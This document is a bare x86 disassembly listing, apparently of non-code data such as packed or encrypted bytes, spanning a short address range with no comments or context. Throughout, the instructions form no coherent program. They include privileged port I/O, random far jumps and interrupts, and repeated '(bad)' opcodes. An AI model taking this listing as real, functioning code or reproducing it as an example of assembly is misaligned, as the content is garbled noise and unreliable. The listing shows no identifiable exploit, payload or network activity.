  41f64c:	data16 mov ds:0xa9bbec34,al
  41f652:	jns    0x41f64c
  41f654:	sbb    eax,edx
  41f656:	lock jg 0x41f639
  41f659:	inc    eax
  41f65a:	rcl    eax,cl
  41f65c:	retf   
  41f65d:	fcmove st,st(6)
  41f65f:	dec    ecx
  41f660:	in     eax,dx
  41f661:	inc    ecx
  41f662:	enter  0x9715,0x36
  41f666:	ja     0x41f640
  41f668:	push   esi
  41f669:	mov    ebp,0xdd05b035
  41f66e:	adc    al,0xc4
  41f670:	sbb    bl,BYTE PTR [edi+edi*1+0x37cc889f]
  41f677:	cmp    edx,edi
  41f679:	scas   eax,DWORD PTR es:[edi]
  41f67a:	add    BYTE PTR [eax],al
  41f67c:	jle    0x41f62f
  41f67e:	jle    0x41f653
  41f680:	fstp   QWORD PTR [edi]
  41f682:	and    ebx,DWORD PTR [esi+0xce4a6b]
  41f688:	mov    ebx,0xf8fc2188
  41f68d:	inc    ebx
  41f68e:	xlat   BYTE PTR ds:[ebx]
  41f68f:	and    bh,BYTE PTR [ebx-0x7ba075b3]
  41f695:	hlt    
  41f696:	mov    esi,0xb4e93241
  41f69b:	pop    es
  41f69c:	rol    DWORD PTR [ecx-0x36813117],1
  41f6a2:	and    edx,esp
  41f6a4:	add    ah,BYTE PTR [esi-0x538d823]
  41f6aa:	adc    BYTE PTR [edx-0x23c26f89],dh
  41f6b0:	mov    ebx,0xed94b6ab
  41f6b5:	mov    ch,0x2
  41f6b7:	push   0xffffff8a
  41f6b9:	jge    0x41f6be
  41f6bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f6bc:	ror    DWORD PTR [edx+esi*2],0x9e
  41f6c0:	pop    es
  41f6c1:	jp     0x41f6d5
  41f6c3:	les    edx,FWORD PTR [eax+edx*2]
  41f6c6:	inc    edx
  41f6c7:	shl    bh,1
  41f6c9:	les    esi,FWORD PTR [eax-0x1e]
  41f6cc:	out    dx,eax
  41f6cd:	not    DWORD PTR ds:0x28d1d8b1
  41f6d3:	sahf   
  41f6d4:	xchg   esi,eax
  41f6d5:	mov    esi,0x37c14e3
  41f6da:	popf   
  41f6db:	lods   eax,DWORD PTR ds:[esi]
  41f6dc:	adc    DWORD PTR [eax+edi*2-0x3455f61c],0xffffffb9
  41f6e4:	pop    eax
  41f6e5:	dec    ebp
  41f6e6:	inc    esi
  41f6e7:	lods   eax,DWORD PTR ds:[esi]
  41f6e8:	loope  0x41f742
  41f6ea:	(bad)  
  41f6ec:	and    DWORD PTR [edx+0x3eb7fb7a],ecx
  41f6f2:	loop   0x41f74d
  41f6f4:	in     al,0xa9
  41f6f6:	jg     0x41f76a
  41f6f8:	ss pop es
  41f6fa:	inc    edi
  41f6fb:	fwait
  41f6fc:	loope  0x41f6ec
  41f6fe:	fwait
  41f6ff:	push   edi
  41f700:	cdq    
  41f701:	adc    cl,dl
  41f703:	inc    ebp
  41f704:	out    0xfe,eax
  41f706:	out    dx,al
  41f707:	mov    DWORD PTR [edx-0x62],esp
  41f70a:	sub    eax,0x7cf2ea29
  41f70f:	xchg   edi,eax
  41f710:	pop    edx
  41f711:	jp     0x41f75e
  41f713:	mov    ah,0x69
  41f715:	clc    
  41f716:	inc    esi
  41f717:	in     eax,dx
  41f718:	rcl    esi,1
  41f71a:	push   cs
  41f71b:	lea    edi,[ebp-0x37a61d81]
  41f721:	mov    WORD PTR [ecx-0x3c],ds
  41f724:	test   al,0xfe
  41f726:	data16 jns 0x41f742
  41f729:	cdq    
  41f72a:	call   0x98014ac9
  41f72f:	add    edx,DWORD PTR [esi-0x5b1e470a]
  41f735:	inc    ecx
  41f736:	in     eax,0xc1
  41f738:	daa    
  41f739:	sar    BYTE PTR [edx],cl
  41f73b:	xor    al,0xfe
  41f73d:	ins    BYTE PTR es:[edi],dx
  41f73e:	mov    bl,ah
  41f740:	test   BYTE PTR [esp+eax*8+0x55],bl
  41f744:	not    bl
  41f746:	pop    eax
  41f747:	out    dx,al
  41f748:	aad    0x39
  41f74a:	repnz push es
  41f74c:	jae    0x41f7b7
  41f74e:	and    al,0x93
  41f750:	xor    BYTE PTR [ecx+0x2f16e768],bl
  41f756:	loopne 0x41f768
  41f758:	(bad)
  41f75b:	sub    cl,BYTE PTR ds:[eax]
  41f75e:	add    ebx,ebp
  41f760:	push   edi
  41f761:	push   cs
  41f762:	out    dx,eax
  41f763:	jg     0x41f757
  41f765:	fnstenv [ebp+eax*4-0x39]
  41f769:	jmp    0xecd1:0xf8227343
  41f770:	mov    bl,0x60
  41f772:	add    bh,BYTE PTR [eax]
  41f774:	dec    ecx
  41f775:	nop
  41f776:	adc    ebx,edi
  41f778:	mov    ah,0xce
  41f77a:	inc    esi
  41f77b:	les    ecx,FWORD PTR [ebx-0x603ae2b]
  41f781:	sbb    BYTE PTR [ecx],bh
  41f783:	push   esp
  41f784:	xchg   edi,eax
  41f785:	ds stc 
  41f787:	dec    edx
  41f788:	add    ecx,DWORD PTR [ebp-0x47]
  41f78b:	nop
  41f78c:	mov    dh,0x1e
  41f78e:	sub    BYTE PTR [edi-0x47dcbfb2],bl
  41f794:	mov    bh,0x2e
  41f796:	cs addr16 mov ebp,0x2445b263
  41f79d:	mov    eax,ds:0x3da886dc
  41f7a2:	mov    eax,ds:0x25cb0bf3
  41f7a7:	ss clc 
  41f7a9:	icebp  
  41f7aa:	mov    ah,0x5f
  41f7ac:	and    bl,al
  41f7ae:	ret    
  41f7af:	xor    esi,DWORD PTR [esp+edi*4+0x51]
  41f7b3:	cmp    edx,DWORD PTR [edi+0xe6d72dc]
  41f7b9:	push   cs
  41f7ba:	cwde   
  41f7bb:	out    dx,eax
  41f7bc:	stc    
  41f7bd:	inc    esi
  41f7be:	xchg   ecx,eax
  41f7bf:	xchg   ecx,eax
  41f7c0:	mov    eax,0xde9b81ac
  41f7c5:	jmp    0x2f61:0xfc520949
  41f7cc:	stc    
  41f7cd:	sbb    edi,DWORD PTR [eax]
  41f7cf:	mov    ch,0xcb
  41f7d1:	jae    0x41f7d5
  41f7d3:	dec    edi
  41f7d4:	sahf   
  41f7d5:	mov    cl,0x50
  41f7d7:	hlt    
  41f7d8:	jle    0x41f778
  41f7da:	mov    cl,0x7
  41f7dc:	sub    bh,BYTE PTR [ecx]
  41f7de:	or     eax,DWORD PTR [esp+esi*8]
  41f7e1:	add    al,0xf7
  41f7e3:	stos   BYTE PTR es:[edi],al
  41f7e4:	xchg   esi,eax
  41f7e5:	pushf  
  41f7e6:	scas   al,BYTE PTR es:[edi]
  41f7e7:	xchg   edi,eax
  41f7e8:	dec    ecx
  41f7e9:	leave  
  41f7ea:	mov    dh,0x35
  41f7ec:	dec    ebx
  41f7ed:	mov    al,0x1f
  41f7ef:	jl     0x41f7a5
  41f7f1:	mov    BYTE PTR [esi+edi*4-0x4ec3154e],al
  41f7f8:	std    
  41f7f9:	jb     0x41f838
  41f7fb:	push   es
  41f7fc:	daa    
  41f7fd:	xor    eax,0x159de1e1
  41f802:	adc    eax,0x19555b0b
  41f807:	idiv   DWORD PTR [ebx-0x28]
  41f80a:	in     eax,dx
  41f80b:	test   al,0xe5
  41f80d:	leave  
  41f80e:	inc    edi
  41f80f:	add    ch,dh
  41f811:	inc    esp
  41f812:	dec    ecx
  41f813:	sbb    al,ch
  41f815:	inc    ebx
  41f816:	dec    ecx
  41f817:	sbb    DWORD PTR [ebp+ebp*4-0x74455555],ebx
  41f81e:	div    DWORD PTR [edi-0x5e6eef5d]
  41f824:	mov    eax,ds:0xd582544d
  41f829:	lock aas 
  41f82b:	xor    bl,BYTE PTR [ebp+esi*8-0x58]
  41f82f:	xchg   BYTE PTR [ecx-0x43],dl
  41f832:	inc    esi
  41f833:	mov    ds:0x8f11ab9d,eax
  41f838:	mov    dl,0x81
  41f83a:	out    dx,eax
  41f83b:	mov    bh,BYTE PTR [ebp+0x336ff87]
  41f841:	push   ebp
  41f842:	cmp    ch,0x79
  41f845:	mov    dh,dl
  41f847:	pop    edx
  41f848:	cmc    
  41f849:	and    al,BYTE PTR [edx+0x6f]
  41f84c:	mov    gs,esp
  41f84e:	sub    eax,0xb8fa2e8b
  41f853:	cs fdivr st(0),st
  41f856:	(bad)  
  41f857:	pop    edi
  41f858:	dec    esi
  41f859:	mov    dh,0xf9
  41f85b:	int3   
  41f85c:	loop   0x41f7f9
  41f85e:	in     eax,dx
  41f85f:	jge    0x41f85c
  41f861:	mov    al,0xb3
  41f863:	fisttp QWORD PTR [esi+0x2b]
  41f866:	add    bl,BYTE PTR [ebx]
  41f868:	(bad)  
  41f869:	dec    esp
  41f86a:	(bad)  
  41f86b:	lock inc esi
  41f86d:	(bad)  
  41f86e:	jbe    0x41f8e4
  41f870:	cli    
  41f871:	mov    dl,0xc2
  41f873:	jge    0x41f8f3
  41f875:	jmp    0x41f8e8
  41f877:	retf   0xf968
  41f87a:	das    
  41f87b:	or     ebx,DWORD PTR [edx+0x1a0d1850]
  41f881:	cs es jmp 0x21ee:0x475e89b3
  41f88a:	jl     0x41f8c3
  41f88c:	rol    BYTE PTR [edi],cl
  41f88e:	sub    eax,0xbad35559
  41f893:	data16 arpl WORD PTR [edx-0x77],si
  41f897:	ja     0x41f903
  41f899:	bound  edx,QWORD PTR [esp+ecx*8]
  41f89c:	leave  
  41f89d:	sti    
  41f89e:	outs   dx,DWORD PTR ds:[esi]
  41f89f:	into   
  41f8a0:	dec    ecx
  41f8a1:	fcom   st(3)
  41f8a3:	and    DWORD PTR [edi+0x53d37436],edx
  41f8a9:	leave  
  41f8aa:	sbb    DWORD PTR [edx+0x230e104],eax
  41f8b0:	leave  
  41f8b1:	dec    edi
  41f8b2:	das    
  41f8b3:	jns    0x41f858
  41f8b5:	inc    esp
  41f8b6:	pop    ebp
  41f8b7:	cs loop 0x41f919
  41f8ba:	test   eax,0x859fb28c
  41f8bf:	shl    BYTE PTR [ecx-0x47383b82],cl
  41f8c5:	mov    eax,0xc126b04e
  41f8ca:	inc    esp
  41f8cb:	add    eax,0x6df179e0
  41f8d0:	scas   eax,DWORD PTR es:[edi]
  41f8d1:	push   es
  41f8d2:	sub    cl,cl
  41f8d4:	add    al,0xf1
  41f8d6:	jnp    0x41f8f6
  41f8d8:	ins    BYTE PTR es:[edi],dx
  41f8d9:	sahf   
  41f8da:	jbe    0x41f89e
  41f8dc:	jecxz  0x41f887
  41f8de:	sbb    al,0xb7
  41f8e0:	(bad)  
  41f8e1:	in     eax,0x6a
  41f8e3:	mov    edx,0x5042f4d9
  41f8e8:	lods   eax,DWORD PTR ds:[esi]
  41f8e9:	ucomiss xmm1,DWORD PTR [ebx+0x36]
  41f8ed:	xchg   esi,eax
  41f8ee:	xchg   ebx,eax
  41f8ef:	inc    edi
  41f8f0:	or     eax,0xc0f4fb0f
  41f8f5:	jns    0x41f970
  41f8f7:	push   ds
  41f8f8:	lds    esp,FWORD PTR [ebp-0x1f]
  41f8fb:	ds jns 0x41f978
  41f8fe:	std    
  41f8ff:	or     eax,0x9df4bd67
  41f904:	sub    ebx,DWORD PTR [ecx-0x48]
  41f907:	std    
  41f908:	xchg   BYTE PTR [ebx-0xb],dh
  41f90b:	movsx  ebx,bl
  41f90e:	ret    0x2b3d
  41f911:	fild   QWORD PTR [ebx+0x58]
  41f914:	inc    edx
  41f915:	sbb    bl,BYTE PTR [edx-0x44a51f23]
  41f91b:	aaa    
  41f91c:	inc    eax
  41f91d:	mov    ecx,ds
  41f91f:	es enter 0x6221,0x36
  41f924:	lock inc ecx
  41f926:	(bad)  
  41f927:	cmp    BYTE PTR [ebp+0x2b3a406d],cl
  41f92d:	cmp    al,0x5c
  41f92f:	mov    bh,0x69
  41f931:	jo     0x41f93e
  41f933:	mov    ch,BYTE PTR [edi]
  41f935:	pop    ecx
  41f936:	sti    
  41f937:	xchg   esp,eax
  41f938:	adc    ebp,esp
  41f93a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f93b:	pop    esp
  41f93c:	pop    ss
  41f93d:	loope  0x41f8f2
  41f93f:	out    0x46,al
  41f941:	leave  
  41f942:	xchg   BYTE PTR [ebp-0x3e00725a],ah
  41f948:	fisttp QWORD PTR ds:0xe323bf69
  41f94e:	call   DWORD PTR [ebp+0x68]
  41f951:	pop    eax
  41f952:	std    
  41f953:	pop    ebx
  41f954:	outs   dx,BYTE PTR ds:[esi]
  41f955:	xchg   ebx,eax
  41f956:	retf   
  41f957:	inc    edi
  41f958:	shl    BYTE PTR [edx-0x6c4b7398],cl
  41f95e:	adc    BYTE PTR [edx],dh
  41f960:	fldenv [edx-0x5d]
  41f963:	std    
  41f964:	ret    0x4df0
  41f967:	enter  0x9d54,0x80
  41f96b:	jnp    0x41f958
  41f96d:	dec    ebp
  41f96e:	xchg   esi,eax
  41f96f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f970:	xchg   esp,eax
  41f971:	jl     0x41f9db
  41f973:	nop
  41f974:	sub    al,BYTE PTR [edi-0x69]
  41f977:	jo     0x41f92c
  41f979:	stos   DWORD PTR es:[edi],eax
  41f97a:	cwde   
  41f97b:	sub    al,0xf4
  41f97d:	jle    0x41f97f
  41f97f:	xchg   BYTE PTR [esi-0x43ffdb32],dh
  41f985:	jg     0x41f94b
  41f987:	ret    
  41f988:	pop    ebp
  41f989:	xchg   ebp,eax
  41f98a:	mov    edi,esi
  41f98c:	lods   eax,DWORD PTR ds:[esi]
  41f98d:	jp     0x41f9a5
  41f98f:	push   es
  41f990:	data16 sub BYTE PTR cs:[esi+0x75],ah
  41f995:	push   esp
  41f996:	xchg   ecx,eax
  41f997:	retf   
  41f998:	and    BYTE PTR [ecx+0x6db79d3c],0x87
  41f99f:	adc    al,0x24
  41f9a1:	jmp    0x41f9ce
  41f9a3:	mov    dh,0xbb
  41f9a5:	sahf   
  41f9a6:	cli    
  41f9a7:	jmp    0x3f37:0xe0c23808
  41f9ae:	xlat   BYTE PTR ds:[ebx]
  41f9af:	xor    ebx,esi
  41f9b1:	cdq    
  41f9b2:	adc    DWORD PTR [ebx+ebx*4+0x57dcfd66],edi
  41f9b9:	in     eax,0xd9
  41f9bb:	mov    ebx,0x32956823
  41f9c0:	or     eax,0x765139e0
  41f9c5:	jle    0x41f9fb
  41f9c7:	jb     0x41f9e9
  41f9c9:	sbb    DWORD PTR [edi-0x69ee3d5a],edx
  41f9cf:	and    eax,DWORD PTR [ebx-0x2]
  41f9d2:	inc    ebx
  41f9d3:	cmp    BYTE PTR [edi+0x2a2c53bb],0x87
  41f9da:	mov    ds:0xd9ecfa62,al
  41f9df:	fdivr  DWORD PTR [eax]
  41f9e1:	inc    eax
  41f9e2:	push   0x24
  41f9e4:	fs das 
  41f9e6:	dec    ebp
  41f9e7:	xlat   BYTE PTR ds:[ebx]
  41f9e8:	add    ecx,DWORD PTR [edx+edx*1]
  41f9eb:	mov    dl,0x2
  41f9ed:	adc    bh,dh
  41f9ef:	lds    ebx,FWORD PTR ds:0x3fedc0ab
  41f9f5:	fdivr  QWORD PTR [ecx-0x2499d114]
  41f9fb:	and    eax,0x9962b40a
  41fa00:	enter  0xc0d0,0x54
  41fa04:	(bad)  
  41fa05:	and    ecx,DWORD PTR [edx-0x64]
  41fa08:	shl    ecx,cl
  41fa0a:	adc    eax,0xe4c7583c
  41fa0f:	call   0x406c14d6
  41fa14:	or     eax,0x43ef2f2f
  41fa19:	xchg   ebx,eax
  41fa1a:	sahf   
  41fa1b:	stc    
  41fa1c:	arpl   bx,cx
  41fa1e:	add    eax,0xb966d5ac
  41fa23:	shl    BYTE PTR [ecx-0x4c],1
  41fa26:	inc    edi
  41fa27:	adc    DWORD PTR [edi],esp
  41fa29:	mov    dh,0x84
  41fa2b:	sub    DWORD PTR [ebx-0x2e373645],edx
  41fa31:	jl     0x41fa6f
  41fa33:	rol    BYTE PTR [eax+0x4b],cl
  41fa36:	sti    
  41fa37:	pop    edx
  41fa38:	xchg   eax,esi
  41fa3a:	and    ah,cl
  41fa3c:	std    
  41fa3d:	sbb    eax,0x2715a211
  41fa42:	icebp  
  41fa43:	mov    eax,0x3ac7dc01
  41fa48:	imul   edx,edx,0xffffffa9
  41fa4b:	rcr    BYTE PTR ss:[edi+ebp*8-0x2153a0c1],0xec
  41fa54:	iret   
  41fa55:	dec    edx
  41fa56:	jge    0x41fa2d
  41fa58:	loopne 0x41f9e4
  41fa5a:	mov    bl,0x5e
  41fa5c:	enter  0x994f,0x8d
  41fa60:	xchg   DWORD PTR [esi+0x2672b5f6],ebp
  41fa66:	or     al,bl
  41fa68:	rcl    DWORD PTR ss:[ebx],1
  41fa6b:	pushf  
  41fa6c:	popa   
  41fa6d:	rol    DWORD PTR [edx],cl
  41fa6f:	loop   0x41faea
  41fa71:	and    ecx,ecx
  41fa73:	cmc    
  41fa74:	xchg   esi,eax
  41fa75:	sar    DWORD PTR [esi-0x4f],1
  41fa78:	scas   al,BYTE PTR es:[edi]
  41fa79:	xor    eax,0x18891146
  41fa7e:	cmp    eax,DWORD PTR [esi+0x1]
  41fa81:	sub    eax,0xec3a646c
  41fa86:	jne    0x41facb
  41fa88:	pop    ds
  41fa89:	(bad)
  41fa8c:	and    cl,al
  41fa8e:	jns    0x41facc
  41fa90:	push   ebx
  41fa91:	adc    BYTE PTR [ebx],cl
  41fa93:	and    al,0xa6
  41fa95:	xchg   edx,eax
  41fa96:	out    dx,eax
  41fa97:	jp     0x41faae
  41fa99:	cmc    
  41fa9a:	xchg   DWORD PTR [esi+0x2cbe1e79],edx
  41faa0:	faddp  st(0),st
  41faa2:	retf   
  41faa3:	sar    DWORD PTR [ebp+ebp*2-0x11c8670c],0x86
  41faab:	rcl    DWORD PTR [ebp-0x71],0x3c
  41faaf:	outs   dx,DWORD PTR ds:[esi]
  41fab0:	xchg   DWORD PTR gs:[edx-0x65],esi
  41fab4:	fisubr DWORD PTR [esi-0x1b0b9e8d]
  41faba:	fcmovnb st,st(0)
  41fabc:	out    0x85,al
  41fabe:	sbb    ah,BYTE PTR [edi-0x2b84790e]
  41fac4:	aas    
  41fac5:	cmp    al,BYTE PTR [ebx]
  41fac7:	mov    esp,0xe433c535
  41facc:	ja     0x41fadf
  41face:	add    al,0xb6
  41fad0:	and    bl,BYTE PTR [edi-0x30803685]
  41fad6:	jmp    0x69caf9be
  41fadb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fadc:	(bad)  
  41fade:	mov    ah,al
  41fae0:	dec    esp
  41fae1:	or     bl,BYTE PTR [ebx-0x4a085107]
  41fae7:	jle    0x41fad1
  41fae9:	jmp    0xa3abe86f
  41faee:	fild   DWORD PTR [eax-0x69]
  41faf1:	pop    edi
  41faf2:	adc    al,0x6
  41faf4:	adc    edi,esi
  41faf6:	(bad)  
  41faf7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41faf8:	mov    cl,0x8d
  41fafa:	arpl   WORD PTR [eax+0x61e62d10],bx
  41fb00:	enter  0xc55,0xc8
  41fb04:	mov    edi,0xe13ca9a9
  41fb09:	in     eax,0x45
  41fb0b:	retf   
  41fb0c:	leave  
  41fb0d:	dec    eax
  41fb0e:	arpl   bp,ax
  41fb10:	lods   al,BYTE PTR ds:[esi]
  41fb11:	jo     0x41fb61
  41fb13:	jg     0x41fb88
  41fb15:	or     eax,0x68b353f7
  41fb1a:	push   edx
  41fb1b:	out    dx,al
  41fb1c:	fcomp  DWORD PTR [esi]
  41fb1e:	mov    ds:0xe4ed56c7,al
  41fb23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fb24:	or     esi,DWORD PTR [ebx]
  41fb26:	push   cs
  41fb27:	adc    DWORD PTR [eax-0x397d52a9],0xffffff97
  41fb2e:	loop   0x41fafb
  41fb30:	mov    ds:0x55ba0bd8,eax
  41fb35:	mov    bh,0x13
  41fb37:	enter  0xbddc,0x84
  41fb3b:	in     eax,0x70
  41fb3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fb3e:	jmp    0xf782:0x361c2523
  41fb45:	les    ebp,FWORD PTR [ebx-0x60efe76f]
  41fb4b:	and    bl,BYTE PTR [edi]
  41fb4d:	lock das 
  41fb4f:	push   0x2f
  41fb51:	rcr    DWORD PTR [edx],cl
  41fb53:	icebp  
  41fb54:	pop    ss
  41fb55:	mov    bl,0xb4
  41fb57:	and    cl,0x6f
  41fb5a:	ret    
  41fb5b:	ja     0x41fba8
  41fb5d:	out    dx,al
  41fb5e:	cmc    
  41fb5f:	pop    edi
  41fb60:	dec    ecx
  41fb61:	lahf   
  41fb62:	in     al,dx
  41fb63:	daa    
  41fb64:	fwait
  41fb65:	sahf   
  41fb66:	add    BYTE PTR [esi],cl
  41fb68:	imul   ebp,esp,0x21
  41fb6b:	test   al,0x84
  41fb6d:	mov    al,BYTE PTR [edi]
  41fb6f:	sub    al,0xc2
  41fb71:	jecxz  0x41fb1f
  41fb73:	mov    edx,0x4878e265
  41fb78:	loope  0x41fb52
  41fb7a:	xchg   esi,eax
  41fb7b:	lahf   
  41fb7c:	das    
  41fb7d:	jmp    0x41fbe2
  41fb7f:	test   DWORD PTR [esi],esp
  41fb81:	ror    DWORD PTR [edx+0x4607105c],cl
  41fb87:	shr    DWORD PTR [edx],1
  41fb89:	or     BYTE PTR [ebx-0x20],dl
  41fb8c:	push   0xffffff9b
  41fb8e:	xor    esi,ebx
  41fb90:	or     al,0x3d
  41fb92:	cmp    al,0xe
  41fb94:	mov    esi,0x7745e043
  41fb99:	sbb    ecx,DWORD PTR [ebp-0x41]
  41fb9c:	cmp    BYTE PTR [edx-0x327d262a],dh
  41fba2:	xchg   ch,dl
  41fba4:	adc    BYTE PTR [edi],dh
  41fba6:	push   ebp
  41fba7:	rcr    DWORD PTR [edi-0x7d6d276a],0xf7
  41fbae:	mov    cl,0xf8
  41fbb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fbb1:	inc    ebp
  41fbb2:	jp     0x41fb79
  41fbb4:	gs inc eax
  41fbb6:	xchg   ebp,eax
  41fbb7:	sub    BYTE PTR [edx+0x5762a27f],0xf5
  41fbbe:	in     eax,dx
  41fbbf:	jno    0x41fbdf
  41fbc1:	stos   DWORD PTR es:[edi],eax
  41fbc2:	aad    0x36
  41fbc4:	loope  0x41fbb9
  41fbc6:	cmp    ah,0x8c
  41fbc9:	iret   
  41fbca:	outs   dx,DWORD PTR ds:[esi]
  41fbcb:	push   edi
  41fbcc:	retf   0xd903
  41fbcf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fbd0:	and    BYTE PTR [eax-0x30],al
  41fbd3:	xor    al,0xe5
  41fbd5:	fild   WORD PTR gs:[eax-0x1ada5c73]
  41fbdc:	mov    bl,0xed
  41fbde:	jae    0x41fb6a
  41fbe0:	pop    esp
  41fbe1:	sti    
  41fbe2:	inc    ebx
  41fbe3:	shl    ecx,0x47
  41fbe6:	sub    esi,DWORD PTR [eax+0x27]
  41fbe9:	(bad)  
  41fbea:	or     DWORD PTR [edi+0x6396f5c2],esi
  41fbf0:	jmp    0xb621:0xcc49e55b
  41fbf7:	loopne 0x41fbd9
  41fbf9:	outs   dx,DWORD PTR ds:[esi]
  41fbfa:	ss sub edi,ebp
  41fbfd:	inc    ebx
  41fbfe:	shl    esi,1
  41fc00:	ins    DWORD PTR es:[edi],dx
  41fc01:	jo     0x41fc41
  41fc03:	or     eax,0x3811f6dd
  41fc08:	sbb    ah,al
  41fc0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc0b:	je     0x41fbd2
  41fc0d:	xchg   ecx,eax
  41fc0e:	lods   al,BYTE PTR ds:[esi]
  41fc0f:	push   ds
  41fc10:	push   edx
  41fc11:	push   es
  41fc12:	int    0x29
  41fc14:	pop    ebx
  41fc15:	add    BYTE PTR [esp+ebx*8],ah
  41fc18:	xor    eax,0x17bac0ce
  41fc1d:	mov    ah,0x1c
  41fc1f:	ins    DWORD PTR es:[edi],dx
  41fc20:	int    0x94
  41fc22:	ret    
  41fc23:	push   esi
  41fc24:	sub    BYTE PTR [esi],al
  41fc26:	sub    eax,0xe8645178
  41fc2b:	add    eax,0x5e5d86a2
  41fc30:	jnp    0x41fbea
  41fc32:	arpl   sp,di
  41fc34:	xchg   edx,eax
  41fc35:	adc    DWORD PTR [edx-0x25],ebp
  41fc38:	retf   0x6ca9
  41fc3b:	inc    eax
  41fc3c:	adc    DWORD PTR [ebp-0x3d],0x55
  41fc40:	pushf  
  41fc41:	xchg   bh,bh
  41fc43:	pop    eax
  41fc44:	loop   0x41fc72
  41fc46:	fist   DWORD PTR ds:0x7b73942f
  41fc4c:	inc    ecx
  41fc4d:	mov    BYTE PTR [eax+0x2715912b],ch
  41fc53:	iret   
  41fc54:	mov    fs,WORD PTR [edi-0x5b]
  41fc57:	in     al,dx
  41fc58:	rol    BYTE PTR [ecx-0x24],1
  41fc5b:	jb     0x41fc88
  41fc5d:	cdq    
  41fc5e:	dec    eax
  41fc5f:	pop    es
  41fc60:	test   DWORD PTR [eax-0x632f4395],0x71c160d9
  41fc6a:	cli    
  41fc6b:	push   edi
  41fc6c:	sbb    al,BYTE PTR [edx-0x635b03d]
  41fc72:	mov    edi,0xcb155827
  41fc77:	or     DWORD PTR [ecx+0x67faa8f3],ebp
  41fc7d:	adc    DWORD PTR [eax-0x5054de],0xfffffff6
  41fc84:	fcmovbe st,st(3)
  41fc86:	xchg   esp,eax
  41fc87:	aam    0x13
  41fc89:	adc    bl,BYTE PTR [eax+0x69]
  41fc8c:	scas   eax,DWORD PTR es:[edi]
  41fc8d:	mov    ebx,0x2c667bb8
  41fc92:	lods   eax,DWORD PTR ds:[esi]
  41fc93:	cmc    
  41fc94:	stc    
  41fc95:	adc    al,0xd6
  41fc97:	and    DWORD PTR [ebx-0x20],edx
  41fc9a:	aad    0x2f
  41fc9c:	popa   
  41fc9d:	sub    eax,0x199dfa29
  41fca2:	pop    ebx
  41fca3:	pusha  
  41fca4:	sahf   
  41fca5:	adc    al,0xbd
  41fca7:	pop    esp
  41fca8:	mov    al,0xf3
  41fcaa:	sub    ch,al
  41fcac:	call   0x95f0:0x9a9cc0d2
  41fcb3:	test   BYTE PTR [ebx+ebx*4],0x27
  41fcb7:	outs   dx,BYTE PTR ds:[esi]
  41fcb8:	xchg   esp,eax
  41fcb9:	add    eax,0x9b764162
  41fcbe:	push   ebx
  41fcbf:	push   edi
  41fcc0:	mov    ds:0x6377b9d3,al
  41fcc5:	pusha  
  41fcc6:	cwde   
  41fcc7:	ret    0xd5aa
  41fcca:	cs test eax,0x781c4b7c
  41fcd0:	mov    ch,0xf3
  41fcd2:	adc    cl,bh
  41fcd4:	aaa    
  41fcd5:	sbb    eax,0x4353640f
  41fcda:	push   ecx
  41fcdb:	ss sub al,0x6a
  41fcde:	lods   ax,WORD PTR ds:[esi]
  41fce0:	mov    ch,0x20
  41fce2:	or     BYTE PTR ds:0xe3efef7f,bh
  41fce8:	test   dh,bl
  41fcea:	jl     0x41fc80
  41fcec:	push   cs
  41fced:	lea    ebx,[ebp+0x71e24ded]
  41fcf3:	pop    ebx
  41fcf4:	ins    BYTE PTR es:[edi],dx
  41fcf5:	pusha  
  41fcf6:	dec    ecx
  41fcf7:	in     al,0x1f
  41fcf9:	jne    0x41fcbe
  41fcfb:	mov    eax,ds:0x8b8d24bd
  41fd00:	lds    ebp,FWORD PTR [eax+ecx*4-0x7cc352a0]
  41fd07:	pop    edi
  41fd08:	xchg   BYTE PTR [ebx-0x2e],ah
  41fd0b:	xor    DWORD PTR [ebx+0x79ffbeea],ecx
  41fd11:	jns    0x41fd03
  41fd13:	iret   
  41fd14:	xchg   esp,eax
  41fd15:	mov    ds:0x54562b17,eax
  41fd1a:	out    dx,al
  41fd1b:	fsubr  st,st(4)
  41fd1d:	mov    bh,0x6f
  41fd1f:	inc    eax
  41fd20:	outs   dx,DWORD PTR ds:[esi]
  41fd21:	xchg   edi,eax
  41fd22:	les    ebx,FWORD PTR [esi]
  41fd24:	or     BYTE PTR [edi+0x4e],cl
  41fd27:	jae    0x41fcd0
  41fd29:	cmp    edi,edx
  41fd2b:	inc    DWORD PTR [ebx+0x73]
  41fd2e:	seto   BYTE PTR [eax+0xfced57c]
  41fd35:	ds pop ebx
  41fd37:	xchg   edi,eax
  41fd38:	out    dx,eax
  41fd39:	adc    eax,0xd2dd5dcb
  41fd3e:	lea    eax,[ecx-0x3c]
  41fd41:	jnp    0x41fd85
  41fd43:	adc    esi,DWORD PTR [edi+0x74]
  41fd46:	fistp  QWORD PTR [esi+0x1]
  41fd49:	lds    esp,FWORD PTR gs:[ebx]
  41fd4c:	ret    
  41fd4d:	pop    esi
  41fd4e:	(bad)  
  41fd4f:	mov    al,ds:0x13edce9
  41fd54:	out    dx,al
  41fd55:	mov    ds:0x67a5f26b,al
  41fd5a:	loope  0x41fdc6
  41fd5c:	call   0x41a6535b
  41fd61:	add    cl,dh
  41fd63:	and    ecx,ecx
  41fd65:	fmul   DWORD PTR [eax]
  41fd67:	out    dx,eax
  41fd68:	mov    ds:0xd163062,al
  41fd6d:	adc    eax,0xd0068a48
  41fd72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd73:	sbb    ah,bl
  41fd75:	xchg   esi,eax
  41fd76:	fidiv  DWORD PTR [edi]
  41fd78:	repz fnstsw WORD PTR ds:0xe1c2ee1e
  41fd7f:	neg    BYTE PTR [eax]
  41fd81:	add    esp,DWORD PTR [esi]
  41fd83:	adc    DWORD PTR [edi+0x6],0x65e85475
  41fd8a:	dec    edi
  41fd8b:	cmp    BYTE PTR ds:0xda93376a,bh
  41fd91:	inc    ecx
  41fd92:	in     al,0xa
  41fd94:	in     al,dx
  41fd95:	ret    0x6fe3
